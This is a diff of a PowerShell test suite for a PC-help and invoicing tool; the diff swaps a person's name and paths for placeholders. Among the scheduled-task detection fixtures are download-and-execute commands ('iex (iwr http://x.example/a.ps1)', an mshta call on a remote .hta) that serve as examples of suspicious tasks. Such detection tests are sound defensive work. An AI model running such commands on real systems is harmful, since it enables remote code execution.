@@ -148,7 +148,7 @@ Describe 'Strings' {
         $script:Lang = 'en'
     }
 
-    It 'starts in Dutch for a Dutch Windows or a PC in the Netherlands (Shamil''s PC)' {
+    It 'starts in Dutch for a Dutch Windows or a PC in the Netherlands (the technician''s PC)' {
         Get-HcDefaultLanguage 'nl-NL' 'BE' | Should Be 'nl'
         Get-HcDefaultLanguage 'en-NL' 'NL' | Should Be 'nl'
         Get-HcDefaultLanguage 'en-GB' 'GB' | Should Be 'en'
@@ -351,8 +351,8 @@ Describe 'F: reading the PC' {
         @{ Exe = 'powershell.exe';  Args = '-c "iex (iwr http://x.example/a.ps1)"';            Level = 'strong' }
         @{ Exe = 'mshta.exe';       Args = 'https://x.example/run.hta';                         Level = 'strong' }
         @{ Exe = 'C:\Users\Public\svc.exe'; Args = '';                                          Level = 'strong' }
-        @{ Exe = 'wscript.exe';     Args = '"C:\Users\shami\AppData\Local\Reveille\start-agent-hidden.vbs"'; Level = 'weak' }
-        @{ Exe = 'C:\Users\shami\AppData\Local\Programs\Opera GX\autoupdate\opera_autoupdate.exe'; Args = '--scheduledtask'; Level = $null }
+        @{ Exe = 'wscript.exe';     Args = '"C:\Users\demo\AppData\Local\Reveille\start-agent-hidden.vbs"'; Level = 'weak' }
+        @{ Exe = 'C:\Users\demo\AppData\Local\Programs\Opera GX\autoupdate\opera_autoupdate.exe'; Args = '--scheduledtask'; Level = $null }
         @{ Exe = 'shutdown.exe';    Args = '/r /fw /t 5';                                       Level = $null }
     )
     foreach ($t in $tasks) {
@@ -583,7 +583,7 @@ Describe 'B: sound, video calls and screen' {
         $script:Lang = 'en'
         $qhd = [pscustomobject]@{ Width = 2560; Height = 1440 }
         $fhd = [pscustomobject]@{ Width = 1920; Height = 1080 }
-        # Shamil's PC: two screens, the main one at its own resolution.
+        # The technician's PC: two screens, the main one at its own resolution.
         $r = Test-HcScreen (& $screen @{ Width = 2560; Height = 1440; Native = @($qhd, $fhd) })
         $r.FindingId | Should Be 'screenOk'
         @($r.Results | ForEach-Object { $_.Text }) -contains 'Resolution 2560 x 1440' | Should Be $true
@@ -809,7 +809,7 @@ Describe 'E: Windows and updates' {
             $f | Add-Member Country $country
             $f | Add-Member AutoTimeOff $false
             $f }
-        (Test-HcErrors (& $tz 'W. Europe Standard Time')).FindingId | Should Be 'errorsOk'          # Shamil's PC
+        (Test-HcErrors (& $tz 'W. Europe Standard Time')).FindingId | Should Be 'errorsOk'          # The technician's PC
         (Test-HcErrors (& $tz 'Central Europe Standard Time')).FindingId | Should Be 'errorsOk'     # the same clock
         $wrong = Test-HcErrors (& $tz 'GMT Standard Time')
         $wrong.FindingId | Should Be 'wrongTimeZone'
@@ -920,7 +920,7 @@ Describe 'G1: desktop, taskbar and folders' {
     }
 
     It 'reads "no icons" from the desktop''s view flags, the setting Windows really uses' {
-        Test-HcIconsHidden 0 0x48201224 | Should Be $true          # Shamil's PC: HideIcons says shown, the flags say hidden
+        Test-HcIconsHidden 0 0x48201224 | Should Be $true          # The technician's PC: HideIcons says shown, the flags say hidden
         Test-HcIconsHidden 1 0x48200224 | Should Be $false
         Test-HcIconsHidden 1 $null | Should Be $true               # no view flags yet: the copy counts
         Test-HcIconsHidden 0 $null | Should Be $false
@@ -958,7 +958,7 @@ Describe 'C2: the keyboard types the wrong characters' {
         [pscustomobject]@{ Problems = @(); Keyboards = 1; Pointers = 1; UsbDrives = @(); Keyboard = $k } }
     $fixIds = { param($r) @($r.Actions | ForEach-Object { $_.FixId }) }
 
-    It 'is happy with one US layout and the switches off (Shamil''s PC)' {
+    It 'is happy with one US layout and the switches off (the technician''s PC)' {
         $r = Test-HcInputDevices (& $kb)
         $r.FindingId | Should Be 'devicesOk'
         @($r.Results | ForEach-Object { $_.Text }) -contains '1 keyboard layout(s): US' | Should Be $true
@@ -971,7 +971,7 @@ Describe 'C2: the keyboard types the wrong characters' {
         $r.FindingArgs | Should Be @('Dutch')
     }
 
-    It 'finds the United Kingdom layout, which English (Netherlands) can get (Shamil''s PC)' {
+    It 'finds the United Kingdom layout, which English (Netherlands) can get (the technician''s PC)' {
         $r = Test-HcInputDevices (& $kb @{ Layouts = @(& $layout '00000809' 'United Kingdom' 'en-NL' '2000:00000809') })
         $r.FindingId | Should Be 'wrongLayout'
         $r.FindingArgs | Should Be @('United Kingdom')
@@ -989,7 +989,7 @@ Describe 'C2: the keyboard types the wrong characters' {
         (& $fixIds (Test-HcInputDevices (& $kb @{ Layouts = $apart }))) | Should Be 'openKeyboardSettings'
     }
 
-    It 'opens Settings for layouts read from the session, which cannot be removed here (Shamil''s PC)' {
+    It 'opens Settings for layouts read from the session, which cannot be removed here (the technician''s PC)' {
         $session = @(
             [pscustomobject]@{ Tag = $null; Tip = $null; Klid = '00000409'; Name = 'US' },
             [pscustomobject]@{ Tag = $null; Tip = $null; Klid = '00000807'; Name = 'Swiss German' })
@@ -1027,7 +1027,7 @@ Describe 'C4: laptop battery' {
         @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('openBatterySettings')
     }
 
-    It 'tells a desktop from a laptop whose battery is gone (Shamil''s PC is a desktop)' {
+    It 'tells a desktop from a laptop whose battery is gone (the technician''s PC is a desktop)' {
         $r = Test-HcBattery (& $bat @{ HasBattery = $false; Laptop = $false })
         $r.FindingId | Should Be 'noBattery'
         @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
@@ -1085,7 +1085,7 @@ Describe 'G3: a file cannot be found or opens wrong' {
         $r.Actions[0].Target.Path | Should Be 'C:\Users\x\Downloads'
     }
 
-    It 'names a type that has no program (Word files on Shamil''s PC)' {
+    It 'names a type that has no program (Word files on the technician''s PC)' {
         $types = @([pscustomobject]@{ Extension = '.pdf'; Name = 'Microsoft Edge' }, [pscustomobject]@{ Extension = '.docx'; Name = $null })
         $r = Test-HcFind (& $find @{ Types = $types })
         $r.FindingId | Should Be 'noProgram'
@@ -1137,7 +1137,7 @@ Describe 'G2: files gone or not everywhere' {
         $r.Results[0].Text | Should Be 'Desktop: in the OneDrive folder, 5 items'
     }
 
-    It 'says OneDrive was removed while the folders still live in its folder (Shamil''s PC)' {
+    It 'says OneDrive was removed while the folders still live in its folder (the technician''s PC)' {
         $r = Test-HcFiles (& $files @{ OneDriveExe = $null; OneDriveRunning = $false; SignedIn = $false; RecycleBin = 1 })
         $r.FindingId | Should Be 'oneDriveRemoved'
         @($r.Results | Where-Object { $_.Status -eq 'problem' }).Count | Should Be 1
@@ -1457,7 +1457,7 @@ Describe 'The window (phase 6)' {
         (Test-HcHijack ([pscustomobject]@{ Browsers = @((& $br $null @('https://search.mysearch-tool.com/'))); Policies = @() })).FindingId | Should Be 'browserStartHijack'
         (Test-HcHijack ([pscustomobject]@{ Browsers = @((& $br $null @() @([pscustomobject]@{ Id = 'x'; Name = 'Coupons'; FromStore = $false }))); Policies = @() })).FindingId | Should Be 'browserExtOutside'
         (Test-HcHijack ([pscustomobject]@{ Browsers = @(); Policies = @([pscustomobject]@{ Browser = 'Edge'; Names = @('HubsSidebarEnabled', 'DefaultSearchProviderSearchURL') }) })).FindingId | Should Be 'browserPolicy'
-        # A privacy tool's rules (Copilot off, no shopping) are no hijack: found on Shamil's PC.
+        # A privacy tool's rules (Copilot off, no shopping) are no hijack: found on the technician's PC.
         (Test-HcHijack ([pscustomobject]@{ Browsers = @(); Policies = @([pscustomobject]@{ Browser = 'Edge'; Names = @('HubsSidebarEnabled', 'ShowMicrosoftRewards', 'ExtensionInstallBlocklist') }) })).FindingId | Should Be 'browserOk'
         Get-HcExtensionName @{ name = 'Coupons' } $null 'abc' | Should Be 'Coupons'
         Get-HcExtensionName @{ name = '__MSG_appName__' } $null 'abc' | Should Be 'abc'
@@ -1808,7 +1808,7 @@ Describe 'Pc-overzicht: what this PC is, and the advice' {
         Format-HcSize 512 | Should Be '512 GB'
     }
 
-    It 'is happy with Shamil''s PC' {
+    It 'is happy with the technician''s PC' {
         & $ids (& $pc) | Should Be 'allGood'
     }
 
@@ -1857,7 +1857,7 @@ Describe 'Pc-overzicht: what this PC is, and the advice' {
 Describe 'The window: Afronden and the history' {
     $script:Lang = 'nl'
     # Settings with no IBAN and no BTW yet.
-    $settings = [pscustomobject]@{ business_name = 'Shamil Imanuel'; postcode_city = 'Almere'; email = 'x@example.nl'; iban = $null
+    $settings = [pscustomobject]@{ business_name = 'Demo Repairs'; postcode_city = 'Almere'; email = 'x@example.nl'; iban = $null
         hourly_rate = '20.00'; callout_fee = '0.00'; start_fee = '15.00'; start_minutes = 30; btw_mode = 'unset'; payment_days = 14 }
     $now = [datetime]'2026-09-27 15:00'
 
@@ -1916,7 +1916,7 @@ Describe 'The window: Afronden and the history' {
     }
 
     It 'writes the mail in the visit''s language, greeting by salutation' {
-        $who = [pscustomobject]@{ business_name = 'Shamil Imanuel'; phone = '06-12345678' }
+        $who = [pscustomobject]@{ business_name = 'Demo Repairs'; phone = '06-12345678' }
         $m = New-HcMailText 'note' 'mrs' 'Anna de Vries' $now '' $who
         $m.Subject | Should Be 'Wat er aan uw computer is gedaan'
         ($m.Text -split "`n")[0] | Should Be 'Beste mevrouw Anna de Vries,'
@@ -2013,7 +2013,7 @@ Describe 'The invoice' {
         Get-HcSuggestedMinutes | Should Be 15
     }
 
-    $seller = [pscustomobject]@{ business_name = 'Shamil PC Hulp'; owner_name = 'Shamil'; address = 'Straat 1'; postcode_city = '1234 AB Utrecht'
+    $seller = [pscustomobject]@{ business_name = 'Demo PC Help'; owner_name = 'Demo'; address = 'Straat 1'; postcode_city = '1234 AB Utrecht'
         kvk = '12345678'; btw_number = $null; iban = 'NL00BANK0123456789'; email = 'info@example.nl'; phone = $null }
     $invoice = { param([hashtable]$c = @{})
         $i = [pscustomobject]@{ number = '2026-0001'; issued_at = '2026-09-26T12:00:00Z'; seller = $seller
@@ -2029,7 +2029,7 @@ Describe 'The invoice' {
         $text = @(Get-HcInvoiceBlocks (& $invoice)) | ForEach-Object { $_.Text }
         $all = $text -join "`n"
         $text[0] | Should Be 'FACTUUR 2026-0001'
-        $all | Should Match 'Shamil PC Hulp'
+        $all | Should Match 'Demo PC Help'
         $all | Should Match 'KvK 12345678'
         $all | Should Match 'Mevr\. de Vries'
         $all | Should Match 'Helemaal geen internet'
@@ -2060,7 +2060,7 @@ Describe 'The invoice' {
             $script:Sent[$Body.action] = $Body
             switch ($Body.action) {
                 'unlock'         { & $ok ([pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }) }
-                'settings_get'   { & $ok ([pscustomobject]@{ settings = [pscustomobject]@{ business_name = 'Shamil PC Hulp'; hourly_rate = 40; callout_fee = 15; btw_mode = 'unset' } }) }
+                'settings_get'   { & $ok ([pscustomobject]@{ settings = [pscustomobject]@{ business_name = 'Demo PC Help'; hourly_rate = 40; callout_fee = 15; btw_mode = 'unset' } }) }
                 'invoice_create' { & $ok ([pscustomobject]@{ invoice = (& $invoice @{ client_name = $Body.client.name }) }) }
                 default          { & $ok ([pscustomobject]@{ visits = @(); saved = $true; id = 1 }) }
             }
@@ -2085,7 +2085,7 @@ Describe 'The invoice' {
             $script:Sent[$Body.action] = $Body
             switch ($Body.action) {
                 'unlock'         { & $ok ([pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }) }
-                'settings_get'   { & $ok ([pscustomobject]@{ settings = [pscustomobject]@{ business_name = 'Shamil'; hourly_rate = 40; callout_fee = 0; btw_mode = 'unset'; iban = $null } }) }
+                'settings_get'   { & $ok ([pscustomobject]@{ settings = [pscustomobject]@{ business_name = 'Demo'; hourly_rate = 40; callout_fee = 0; btw_mode = 'unset'; iban = $null } }) }
                 'invoice_create' { & $ok ([pscustomobject]@{ invoice = (& $invoice @{ payment = $Body.payment; btw_mode = 'unset' }) }) }
                 default          { & $ok ([pscustomobject]@{ visits = @(); saved = $true; id = 1 }) }
             }
@@ -2448,8 +2448,8 @@ Describe 'AI-hulp as a conversation (25 Oct)' {
         New-HcAiPayload $ai 'slow' $null | Should Be "[en]`nslow"
         $ai.Convo = New-HcAiConvo
         $ai.AnswerLang = 'nl'
-        $ai.Extra = @('Shamil ran check C1 himself')
-        New-HcAiPayload $ai 'en nu?' $null | Should Be "[nl]`nShamil ran check C1 himself`nen nu?"
+        $ai.Extra = @('The technician ran check C1 himself')
+        New-HcAiPayload $ai 'en nu?' $null | Should Be "[nl]`nThe technician ran check C1 himself`nen nu?"
         $script:HcVisit.Clear()
     }
 
@@ -2483,9 +2483,9 @@ Describe 'Fixes offered by the checks' {
         $r.Actions[0].Target.Path | Should Be '\'
     }
 
-    It 'recognises Shamil''s own tools by name and script, and offers nothing for them' {
-        $reveille = & $task 'ReveilleAgent' 'wscript.exe "C:\Users\shami\AppData\Local\Reveille\start-agent-hidden.vbs"'
-        $courier = & $task 'CourierAgent' 'wscript.exe "C:\Users\shami\AppData\Local\Courier\start-agent-hidden.vbs"'
+    It 'recognises the technician''s own tools by name and script, and offers nothing for them' {
+        $reveille = & $task 'ReveilleAgent' 'wscript.exe "C:\Users\demo\AppData\Local\Reveille\start-agent-hidden.vbs"'
+        $courier = & $task 'CourierAgent' 'wscript.exe "C:\Users\demo\AppData\Local\Courier\start-agent-hidden.vbs"'
         $r = Test-HcSecurity (New-FakeSecurity @{ Tasks = @($reveille, $courier) }) @('tasks') 'cleanCall'
         @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
         @($r.Actions).Count | Should Be 0
@@ -2641,10 +2641,10 @@ Describe 'The client note' {
         $texts = @(Get-HcNoteBlocks | ForEach-Object { $_.Text })
         $texts -contains 'Er is niets veranderd aan deze pc.' | Should Be $true
         $texts -contains 'Vragen?' | Should Be $false
-        $script:Contact = @('Shamil: +31 6 00000000', 'test@example.com')
+        $script:Contact = @('Technician: +31 6 00000000', 'test@example.com')
         $texts = @(Get-HcNoteBlocks | ForEach-Object { $_.Text })
         $texts -contains 'Vragen?' | Should Be $true
-        $texts -contains 'Shamil: +31 6 00000000' | Should Be $true
+        $texts -contains 'Technician: +31 6 00000000' | Should Be $true
         $texts -contains 'test@example.com' | Should Be $true
         $script:Contact = $saved
     }
@@ -3003,7 +3003,7 @@ Describe 'Area M: a phone through this laptop' {
         $r = Test-HcPhoneSafety (New-FakePhone @{ Packages = $null; Admins = $null; InstallAllowed = $null })
         $r.FindingId | Should Be 'phoneSafeOk'
         @($r.Results | Where-Object { $_.Status -eq 'skipped' }).Count | Should Be 1
-        # Shamil's phone (5 Oct): an empty Accessibility setting gave a nameless warning,
+        # The technician's phone (5 Oct): an empty Accessibility setting gave a nameless warning,
         # and web apps, Samsung's own apps and preinstalled Facebook counted as outside a store.
         $r = Test-HcPhoneSafety (New-FakePhone @{ Accessibility = $null; Listeners = $null; Admins = $null; InstallAllowed = $null
             Packages = @((& $app 'org.chromium.webapk.a6f1527fd51f32258_v2' 'com.android.chrome'), (& $app 'com.sec.android.app.kidshome' $null),
@@ -3295,11 +3295,11 @@ Describe 'Area M: a phone through this laptop' {
         Get-HcPhoneName @{ 'ro.product.manufacturer' = 'Xiaomi'; 'ro.product.model' = '23021RAA2Y'; 'ro.product.marketname' = 'Redmi Note 12' } | Should Be 'Xiaomi Redmi Note 12'
         Get-HcPhoneName @{ 'ro.product.manufacturer' = 'Google'; 'ro.product.model' = 'Pixel 8' } | Should Be 'Google Pixel 8'
         Get-HcPhoneName @{ 'ro.product.manufacturer' = 'Google'; 'ro.product.model' = 'Google Pixel 8' } | Should Be 'Google Pixel 8'
-        $s24 = @{ 'ro.product.manufacturer' = 'samsung'; 'ro.product.model' = 'SM-S928B' }
-        Get-HcPhoneName $s24 'Galaxy S24 Ultra' | Should Be 'Samsung Galaxy S24 Ultra (SM-S928B)'
-        Get-HcPhoneName $s24 'Telefoon van Gerda' | Should Be 'Telefoon van Gerda (Samsung SM-S928B)'
-        Get-HcPhoneName $s24 'SM-S928B' | Should Be 'Samsung SM-S928B'
-        Get-HcPhoneName $s24 '' | Should Be 'Samsung SM-S928B'
+        $samsung = @{ 'ro.product.manufacturer' = 'samsung'; 'ro.product.model' = 'SM-S918B' }
+        Get-HcPhoneName $samsung 'Galaxy S23 Ultra' | Should Be 'Samsung Galaxy S23 Ultra (SM-S918B)'
+        Get-HcPhoneName $samsung 'Telefoon van Gerda' | Should Be 'Telefoon van Gerda (Samsung SM-S918B)'
+        Get-HcPhoneName $samsung 'SM-S918B' | Should Be 'Samsung SM-S918B'
+        Get-HcPhoneName $samsung '' | Should Be 'Samsung SM-S918B'
         Get-HcPhoneName @{ 'ro.product.manufacturer' = 'Google'; 'ro.product.model' = 'Pixel 8' } 'Pixel 8' | Should Be 'Google Pixel 8'
         (ConvertFrom-HcBattery "  level: 57`n  cycle count: 0").Cycles | Should Be $null
     }
@@ -3355,7 +3355,7 @@ Describe 'Kept documents and the overview (7 Oct)' {
         } finally { $script:HcWin = $saved }
     }
 
-    It 'offers Alle klanten only where the device key is (Shamil''s own devices; the relay enforces it)' {
+    It 'offers Alle klanten only where the device key is (the technician''s own devices; the relay enforces it)' {
         $savedPath = $script:HcDeviceKeyPath
         $fake = Join-Path $env:TEMP ('hc-own-' + [guid]::NewGuid().ToString('N'))
         try {
@@ -3472,7 +3472,7 @@ Describe 'Kept documents and the overview (7 Oct)' {
 }
 Describe 'The Kader look: stamp, logo and the questions box (17 Oct)' {
     $script:Lang = 'nl'
-    $seller = [pscustomobject]@{ business_name = 'Shamil Imanuel'; phone = '06-11111111'; email = 'x@example.nl'; iban = 'NL00BANK0123456789' }
+    $seller = [pscustomobject]@{ business_name = 'Demo Repairs'; phone = '06-11111111'; email = 'x@example.nl'; iban = 'NL00BANK0123456789' }
     $make = { param([hashtable]$c = @{})
         $i = [pscustomobject]@{ number = '2026-0005'; issued_at = '2026-10-17T12:00:00Z'; seller = $seller
             client_name = 'Mevr. de Vries'; client_address = $null; client_postcode_city = $null; client_email = $null
@@ -3493,7 +3493,7 @@ Describe 'The Kader look: stamp, logo and the questions box (17 Oct)' {
         @($note | Where-Object { $_.Kind -eq 'logo' }).Count | Should Be 1
     }
 
-    It 'says how to reach Shamil, with the number when there is a real one' {
+    It 'says how to reach the technician, with the number when there is a real one' {
         Get-HcAskText $seller 'B-2026-0001' | Should Be 'Bel of app 06-11111111, of mail x@example.nl. Noem nummer B-2026-0001, dan weet ik meteen wat er is gedaan.'
         Get-HcAskText $seller 'concept' | Should Be 'Bel of app 06-11111111, of mail x@example.nl.'
         Get-HcAskText ([pscustomobject]@{ email = 'x@example.nl' }) '' | Should Be 'Mail x@example.nl.'
@@ -3537,7 +3537,7 @@ Describe 'The internet badge (17 Oct)' {
 
 Describe 'Corrigeren: credit invoice and corrected invoice, and capitals (25 Oct)' {
     $script:Lang = 'en'
-    $settings = [pscustomobject]@{ business_name = 'Shamil Imanuel'; phone = '06-11111111'; email = 'x@example.nl'
+    $settings = [pscustomobject]@{ business_name = 'Demo Repairs'; phone = '06-11111111'; email = 'x@example.nl'
         btw_mode = 'unset'; start_fee = 25; start_minutes = 30; hourly_rate = 30; payment_days = 14 }
     $orig = [pscustomobject]@{ number = '2026-0005'; issued_at = '2026-10-17T12:00:00Z'; pc = $null; lang = 'nl'
         client_name = 'Mevr. de Vries'; client_address = 'Dorpsstraat 1'; client_postcode_city = '1234 AB Ergens'; client_email = ''
